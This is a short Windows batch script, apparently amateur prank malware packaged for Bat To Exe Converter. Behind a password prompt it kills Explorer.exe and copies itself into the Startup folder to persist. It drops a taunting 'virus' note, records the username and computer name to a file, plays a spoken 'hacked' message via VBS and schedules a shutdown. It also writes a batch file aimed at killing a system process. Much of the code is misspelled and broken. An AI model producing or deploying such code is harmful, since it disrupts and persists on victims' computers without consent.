::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFBZdTwyDAE+/Fb4I5/jH6euRq04SWrBxcYzUug==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF25
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJmZk0aGmQ=
::ZQ05rAF9IBncCkqN+0xwdVsCAlLMaiXsZg==
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDCWUPXiuRpQS/OHt5viSsS0=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBZdTwyDAE+/Fb4I5/jHweWTg3sURvcsNorD39Q=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
:pass
title Passrord
echo Password :
set /p saka:=Pass enter:
If %saka:%==456123 goto Virus
If not %saka:%==456123 goto error


:error
echo error Pas end FAK YOU
pause
cls
goto pass


:Virus
title virus
mkdir vhk
cd vhk
Taskkill /f /im Explorer.exe
echo You has virus Great im hak you >Virusnote.txt
start Virusnote.txt
echo copy me Is a Virus %USERNAME%
xcopy %0 C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
echo @echo off >Bosd.bat
set "text:taskkill /f /im winit.exe
echo %text% >Bosd.bat
echo User:%username% Computer Name:%comutername% Windir:%windir% >userInfromasion.txt
echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "spee.vbs"
set text=Hi Pc you has Got hak For NOTAVIRUS
echo speech.speak ("%text%") >> "spee.vbs"
start spee.vbs
shutdown -s -t 120 -c Hi is Pc Is hak HAKK FOR BOBO>OMAK
shutdown -a